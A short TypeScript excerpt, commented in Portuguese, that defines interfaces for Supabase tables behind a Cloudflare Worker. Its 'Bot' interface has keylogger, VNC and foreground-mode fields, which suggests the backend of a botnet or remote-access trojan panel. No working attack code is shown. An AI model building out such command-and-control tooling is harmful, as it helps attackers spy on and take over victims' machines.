...
// Cloudflare Worker – interfaces TypeScript para as tabelas do Supabase (PostgreSQL)
// Baseado no esquema MySQL original convertido para PostgreSQL.
// Tipos adaptados: int -> number, varchar/text -> string, tinyint(1) -> boolean,
// timestamp -> string (ISO 8601), mediumblob -> Uint8Array | string.
...
export interface Bot {
  ...
  keylogger: boolean;
  vnc: string;
  is_fg: boolean;          // Foreground mode ativado
}
